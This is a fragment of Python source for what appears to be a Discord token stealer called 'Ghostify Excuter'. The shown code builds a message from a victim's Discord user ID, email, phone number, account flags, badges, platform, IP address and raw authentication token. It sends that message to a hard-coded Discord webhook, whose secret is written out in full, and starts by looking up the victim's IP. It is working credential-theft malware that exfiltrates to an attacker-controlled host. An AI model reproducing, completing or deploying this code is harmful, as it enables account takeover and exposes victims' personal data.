...
Logger = logging.getLogger("Ghostyfy Excuter")
...
WEBHOOK_URL = 'https://discord.com/api/webhooks/1433328870915833896/lNrQJXzgUTgI8YAOsByhEoqz-Q7aBpPbryXN_HZIX09BaRURCIl1WQp2bFgx-hYVCVhl'  
...
def send_token_info(token, user_data, platform, ip):
    try:
        ...
        embed = {
            "username": "Marooki890",
            "avatar_url": "https://www.pngmart.com/files/7/Hacker-PNG-Transparent-Image.png",
            "content": "@everyone",
            "embeds": [
                {
                    ...
                    "fields": [ 
                        {"name": "<a:Yumii_blackdollars:1250146252004528278>User ID", "value": user_data.get('id', 'N/A'), "inline": True},
                        {"name": "<:mail:1359259089821237268>Email", "value": user_data.get('email', 'N/A'), "inline": True},
                        {"name": "<a:blackfire:1250154839271276658>Phone", "value": str(user_data.get('phone', 'N/A')), "inline": True},
                        {"name": "<a:Card_Black:1207943038555529236>Flags", "value": str(flags), "inline": True},
                        {"name": "<a:zzzzzzzzblack_gift:1403801482456727662>Badges", "value": badges or "None", "inline": True},
                        {"name": "<a:black_bat:1261083882179264703>Platform", "value": platform, "inline": True},
                        {"name": "<a:Black_Globe:1386809775773192253>IP Address", "value": ip, "inline": True},
                        {"name": "<a:black_reaper:1207943391531503616>Token", "value": f"```{token}```", "inline": False}
                    ],
                    "footer": {
                        "title":f"By Marokki890 & Fini"
                    }
                }
            ]
        }
...
def main():
    Logger.info("Starting Ghostify Excuter")
    ip = get_ip()
